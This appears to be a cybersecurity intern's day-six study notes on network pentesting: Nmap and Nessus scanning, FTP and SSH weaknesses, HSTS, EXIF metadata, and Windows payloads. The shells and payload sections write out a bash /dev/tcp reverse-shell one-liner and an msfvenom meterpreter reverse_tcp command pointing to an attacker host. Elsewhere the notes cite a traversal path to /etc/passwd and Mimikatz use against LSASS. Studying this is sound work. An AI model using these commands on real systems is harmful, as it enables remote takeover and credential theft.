
# 🔐 Day 6: Network Pentesting, Nessus, FTP, SSH, and Payloads

---

## 🧩 Encoding Detection & Decoding Tools

### 🔧 Tools Used:
- **[CyberChef](https://gchq.github.io/CyberChef/)** – Swiss army knife for encryption, encoding, compression, and data analysis.
  - Helps decode Base64, URL encoding, hexadecimal, binary, ROT13, etc.
- **[Decoder.fr](https://decoder.fr)** – Tool to detect and decode various encoding/obfuscation formats automatically.

---

## 🛰️ Network Pentesting – Overview

**Network Penetration Testing** is the process of evaluating a system or network for security vulnerabilities. It simulates real-world attacks to:
- Discover exploitable services
- Check for misconfigurations
- Evaluate system resilience to attacks

### 🛠️ Nmap Scanning Basics
- Total ports: `0-65535`
  - `0-1023`: Well-known ports (FTP, SSH, HTTP, etc.)

### 🧱 Nmap Architecture:
1. **Host Discovery** – Identify live systems.
2. **Port Scanning** – Scan physical/digital ports to find open services.
3. **Service Enumeration** – Determine service version, OS, configurations.

### 🧪 Commands:
```bash
nmap -sV -p22 <target-ip>         # Scan port 22
nmap -sV -sC -A <target-ip>       # Full scan with version, script, OS detection
nmap --script ftp-* -p21 <ip>     # FTP vulnerability check
nc -vn <ip> 21                    # Banner grabbing (FTP)
```

---

## 🔍 Nessus Tenable – Network Scanning

**Nessus** is a vulnerability scanner from **Tenable**, widely used for:
- **Automatic vulnerability detection**
- **Credentialed and non-credentialed scans**
- **Real-time risk assessment**

### 🧪 Basic Usage Steps:
1. Open Nessus Web Interface
2. Go to **Advanced Scan**
3. Enter **target IP address**
4. Add relevant **plugin categories**
5. (Optional) Add credentials
6. **Start scan** and analyze report

---

## 🔐 HSTS – HTTP Strict Transport Security

**HSTS** forces web browsers to interact with websites using HTTPS only. Once a browser sees HSTS:
- It will **never connect using HTTP**, even if instructed to.
- Prevents **SSL stripping** attacks.

> HSTS is set via the `Strict-Transport-Security` HTTP header.

---

## 📸 EXIF Tool – Metadata Extraction

**EXIF Tool** extracts metadata from files like images, PDFs, videos:
- Author, creation date, GPS location
- Camera info, device ID

### 🧪 Usage:
```bash
exiftool file.jpg
```
![exif](https://github.com/ayanrfn/cybersecurity-internship-2025/blob/main/day2img/exif.jpg)

---

## 📁 FTP – Port 21

### 📌 FTP Details:
- Used for **file transfers**
- Ports:
  - `21`: Commands
  - `20`: File data

### 🛡️ FTP Vulnerabilities:
1. Plaintext credential transmission
2. Anonymous login (unauthenticated access)
3. Default misconfiguration
4. Directory traversal attacks (`../../etc/passwd`)

### 🛡️ FTP Mitigations:
- Disable anonymous access
- Use FTPS or SFTP (secure FTP over TLS/SSH)
- Restrict file system access
- Strong logging & firewall rules

### 🔧 FTP Config Files:
- `ftp.conf`
- `proftpd.conf`
- `vsftpd.conf`

---

## 👤 FTP Anonymous Login

Some FTP servers allow access without authentication:
```bash
ftp <ip>
Username: anonymous
Password: (any or empty)
```

Useful for attackers to:
- Download internal files
- Upload malicious content

---

## 🔐 SSH – Port 22

SSH (Secure Shell) allows **remote access** to a server securely.

### 🔧 SSH Config Files:
- `/etc/ssh/sshd_config`: Server-side SSH configuration
- `~/.ssh/authorized_keys`: List of public keys for login

### 🧪 SSH Port Scanning:
```bash
nmap -sV -p22 <target-ip>     # Scan SSH
nc <target-ip> 22             # Banner grabbing
```

---

## 💥 Shells – Bind vs Reverse Shell

| Feature        | Bind Shell                         | Reverse Shell                          |
|----------------|-------------------------------------|-----------------------------------------|
| Connection     | Victim opens port & waits           | Victim connects to attacker             |
| Firewall       | Often blocked by NAT/firewalls      | More likely to succeed                  |
| Attacker Role  | Initiates connection                | Listens for incoming from victim        |

### 🔁 Reverse Shell Example:
```bash
# On attacker machine
nc -lvp 4444

# On victim machine (Linux)
bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1
```

---

## 🧠 LSASS – Local Security Authority Subsystem Service

**LSASS** is a Windows service responsible for:
- Enforcing security policies
- Storing password hashes
- Handling authentication

> Attackers target LSASS to extract password hashes from memory using tools like Mimikatz.

---

## 🧨 Windows Payload Creation (Theory)

### 🔧 Example Tools:
- **msfvenom** (from Metasploit)
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=4444 -f exe > payload.exe
```

- Deliver using:
  - USB
  - Email
  - Download + execute via vulnerability

> Run **listener** in Metasploit using `exploit/multi/handler` to receive reverse shell.

---

## ✅ Day 6 Summary

- Learned encoding detection using CyberChef & decoder.fr
- Deep-dived into Nessus Tenable network scanner
- Explored FTP & SSH vulnerabilities and defense
- Studied bind & reverse shell concepts
- Discussed LSASS and payload generation in Windows
- Understood EXIF metadata and HSTS security header

---
